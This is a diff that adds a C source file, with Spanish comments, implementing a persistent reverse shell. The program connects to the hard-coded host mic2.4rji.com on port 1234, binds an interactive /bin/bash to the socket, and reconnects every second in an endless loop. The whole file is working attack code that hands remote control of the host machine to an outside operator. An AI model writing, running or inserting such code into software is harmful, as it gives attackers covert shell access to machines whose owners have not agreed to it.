@@ -1,0 +1,95 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <sys/wait.h>
+
+#define SERVER_HOST "mic2.4rji.com"
+#define SERVER_PORT "1234"
+#define RETRY_SECONDS 1
+
+int run_client_once(void) {
+    struct addrinfo hints, *res = NULL;
+    int sockfd = -1;
+    int ret;
+
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family   = AF_UNSPEC;      // IPv4 o IPv6
+    hints.ai_socktype = SOCK_STREAM;    // TCP
+
+    ret = getaddrinfo(SERVER_HOST, SERVER_PORT, &hints, &res);
+    if (ret != 0) {
+        fprintf(stderr, "[!] getaddrinfo: %s\n", gai_strerror(ret));
+        return -1;
+    }
+
+    // Intentar conectar con la primera dirección válida
+    struct addrinfo *p;
+    for (p = res; p != NULL; p = p->ai_next) {
+        sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
+        if (sockfd == -1)
+            continue;
+
+        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
+            close(sockfd);
+            sockfd = -1;
+            continue;
+        }
+
+        // Conectó
+        break;
+    }
+
+    freeaddrinfo(res);
+
+    if (sockfd == -1) {
+        // No se pudo conectar
+        return -1;
+    }
+
+    pid_t pid = fork();
+    if (pid == 0) {
+        // Hijo: redirige la STDIO al socket y lanza /bin/bash -i
+        dup2(sockfd, STDIN_FILENO);
+        dup2(sockfd, STDOUT_FILENO);
+        dup2(sockfd, STDERR_FILENO);
+        close(sockfd);
+
+        execl("/bin/bash", "/bin/bash", "-i", (char *)NULL);
+        perror("[!] execve");
+        _exit(1);
+    } else if (pid > 0) {
+        // Padre: espera a que la shell cierre para poder reintentar
+        int status;
+        close(sockfd);
+        if (waitpid(pid, &status, 0) == -1) {
+            perror("[!] waitpid");
+            return -1;
+        }
+        return 0;
+    } else {
+        perror("[!] fork");
+        close(sockfd);
+        return -1;
+    }
+}
+
+int main(void) {
+    int counter = 0;
+
+    while (1) {
+        counter++;
+        printf("[*] Attempt #%d to connect to %s:%s\n",
+               counter, SERVER_HOST, SERVER_PORT);
+
+        run_client_once();
+
+        sleep(RETRY_SECONDS);
+    }
+
+    return 0;
+}
